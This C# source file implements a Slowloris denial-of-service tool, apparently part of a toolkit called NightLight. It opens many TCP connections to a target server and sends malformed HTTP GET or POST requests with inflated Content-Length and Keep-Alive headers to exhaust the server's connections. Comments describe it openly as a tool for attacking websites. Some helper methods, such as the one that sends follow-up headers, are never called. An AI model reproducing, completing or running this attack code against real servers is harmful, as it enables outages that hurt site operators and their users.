using System;
using System.Collections;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace NightLight.Slowloris
{
    class SlowLoris : ITool
    {
        /// <summary>
        /// The amount of requests that has been sent to the connection
        /// </summary>
        private uint requestsSent;

        /// <summary>
        /// Holds information about who we shall connect to
        /// </summary>
        private IPEndPoint target;

        /// <summary>
        /// Says what attack type it is
        /// </summary>
        private AttackType type;

        /// <summary>
        /// Keeps track of when we started the attack
        /// </summary>
        private DateTime executionStart;

        /// <summary>
        /// Holds the amount of ms the flood can stay
        /// </summary>
        private int timeOut;

        /// <summary>
        /// Amount of connections that shall be made
        /// </summary>
        private int maxConnections;

        /// <summary>
        /// Holds a boolean on wether the tool has stopped or not
        /// </summary>
        private bool hasStopped;

        /// <summary>
        /// Refferance to the Random class to create random numbers
        /// </summary>
        private Random rnd;

        /// <summary>
        /// Contains all the characters we can use in the random string generation
        /// </summary>
        private char[] charmap = new char[] { '0','1','2','3','4','5','6','7','8','9', 'a','b','c','d',
                                            'e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x',
                                            'y','z' };

        /// <summary>
        /// The variable which will be used in the request strings
        /// </summary>
        private string host;

        /// <summary>
        /// Holds reffereances to the socket connections so we can close when the tool is done dossing
        /// </summary>
        private Queue connections;
        /// <summary>
        /// Returns how many ms the attack has been running
        /// </summary>
        private int ExecutionTime
        {
            get
            {
                return (int)(DateTime.Now - executionStart).TotalMilliseconds;
            }
        }

        /// <summary>
        /// Returns a boolean on wether the tool has been running over the total life-time (RIP :()
        /// </summary>
        public bool IsTimedOut
        {
            get
            {
                return ExecutionTime > timeOut;
            }
        }

        /// <summary>
        /// Constructs the SlowLoris object
        /// </summary>
        /// <param name="type">Says if its a GET or a POST attack</param>
        /// <param name="url">The URL to the website that we shall attack</param>
        public SlowLoris(AttackType type, string url)
        {
            this.type = type;
            this.hasStopped = false;
            this.rnd = new Random();
            this.host = url;
            this.connections = new Queue();
        }

        /// <summary>
        /// Initializes the settings
        /// </summary>
        /// <param name="target">Targets IP</param>
        /// <param name="port">Targets port</param>
        /// <param name="maxConnections">Maximum connections</param>
        /// <param name="timeout">Max time for the tool to live</param>
        public void Init(string target, int port, int maxConnections, int timeout)
        {
            this.target = new IPEndPoint(IPAddress.Parse(target), port);
            this.maxConnections = maxConnections;
            this.timeOut = timeout;
            this.host += string.Format(":{0}", port);
        }

        /// <summary>
        /// Starts the attack by creating the connections. The connections are handed to the thread pool so no new threads are needed
        /// </summary>
        public void Start()
        {
            this.executionStart = DateTime.Now;
            for (int i = 0; i < maxConnections; i++)
            {
                CreateNewConnection();   
            }
        }

        /// <summary>
        /// Creates a new connection
        /// </summary>
        private void CreateNewConnection()
        {
            if (hasStopped)
                return;
            try
            {
                Socket connection = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                connection.BeginConnect(target, ConnectionCreated, connection);
            }
            catch
            { }
        }

        /// <summary>
        /// Callback when the connection has connected to the target
        /// </summary>
        /// <param name="iar">The iar object which contains socket spesific data</param>
        private void ConnectionCreated(IAsyncResult iar)
        {
            try
            {
                Socket connection = (Socket)iar.AsyncState;
                lock (connections.SyncRoot)
                {
                    connections.Enqueue(connection);
                }

                SendSecondaryData(connection);
            }
            catch
            {
                CreateNewConnection();
            }
        }

        /// <summary>
        /// Sends data to the connection
        /// </summary>
        /// <param name="connection">The connection that data will be sent to</param>
        private void SendSecondaryData(Socket connection)
        {
            if (hasStopped)
                return;
            try
            {
                byte[] data = GetPrimaryRequest();
                connection.Send(data);
                requestsSent++;
            }
            catch
            {
                Close(connection);
            }
            finally
            {
                CreateNewConnection();
            }
        }

        /// <summary>
        /// Callback when the data gets sent
        /// </summary>
        /// <param name="iar">Iar object with data related to the callback</param>
        private void DataSent(IAsyncResult iar)
        {
            Socket connection = (Socket)iar.AsyncState;
            try
            {
                requestsSent++;
                connection.EndSend(iar);
                SendSecondaryData(connection);
            }
            catch
            {
                Close(connection);
                CreateNewConnection();
            }
        }

        /// <summary>
        /// Closes the connection
        /// </summary>
        /// <param name="connection">The connection that shall be closed</param>
        private void Close(Socket connection)
        {
            try
            {
                connection.Shutdown(SocketShutdown.Both);
                connection.Close();
            }
            catch { }
        }

        /// <summary>
        /// Encodes a request into a byte array
        /// </summary>
        /// <returns>A byte array thats sent to the socket</returns>
        private byte[] GetPrimaryRequest()
        {
            return ASCIIEncoding.UTF8.GetBytes(GetRequest());
        }

        /// <summary>
        /// Returns a byte array that shall be sent to the socket depending on which attack type we are ysing
        /// </summary>
        /// <returns></returns>
        private byte[] GetSecondaryRequest()
        {
            return ASCIIEncoding.UTF8.GetBytes(type == AttackType.GET ? string.Format("X-c:{0}\r\n", rnd.Next(1, 100000)) : ".");
        }

        /// <summary>
        /// Generates a malformed HTTP request
        /// </summary>
        /// <returns>A HTTP request</returns>
        private string GetRequest()
        {
            StringBuilder builder = new StringBuilder();
            if (type == AttackType.GET)
            {
                builder.AppendLine("GET / HTTP/1.1");
                builder.AppendLine(string.Format("Host: {0}", host));
                builder.AppendLine("User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)");
                builder.AppendLine("Keep-Alive: 900");
                builder.AppendLine(string.Format("Content-Length: {0}", rnd.Next(10000, 1000000)));
                builder.AppendLine("Accept: *.*");
                builder.AppendLine(string.Format("X-a: {0}", rnd.Next(1, 10000)));
            }
            else
            {
                builder.AppendLine(string.Format("POST /{0} HTTP/1.1", GetRandomString(32)));
                builder.AppendLine(string.Format("Host: {0}", host));
                builder.AppendLine("User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)");
                builder.AppendLine("Keep-Alive: 900");
                builder.AppendLine("Content-Length: 1000000000");
                builder.AppendLine("Content-Type: application/x-www-form-urlencoded");
                builder.AppendLine("Accept: *.*");
            }

            return builder.ToString();
        }

        /// <summary>
        /// Generates a random string
        /// </summary>
        /// <param name="length">The length of the string</param>
        /// <returns>Random string</returns>
        private string GetRandomString(int length)
        {
            StringBuilder builder = new StringBuilder(length);
            for (int i = 0; i < length; i++)
            {
                builder.Append(charmap[rnd.Next(0, charmap.Length)]);
            }

            return builder.ToString();
        }

        /// <summary>
        /// Aborts the operation
        /// </summary>
        public void Abort()
        {
            hasStopped = true;

            lock (connections.SyncRoot)
            {
                while (connections.Count > 0)
                {
                    Socket connection = (Socket)connections.Dequeue();
                    try
                    {
                        connection.Close();
                    }
                    catch { }
                }
            }
        }

        /// <summary>
        /// Returns a status of the tool
        /// </summary>
        /// <returns>Status message</returns>
        public string GetStatus()
        {
            StringBuilder status = new StringBuilder();
            status.AppendLine(string.Format("Requests sent: {0}", requestsSent));
            status.AppendLine(string.Format("Total runtime: {0} ms", ExecutionTime));

            return status.ToString();
        }
    }
}
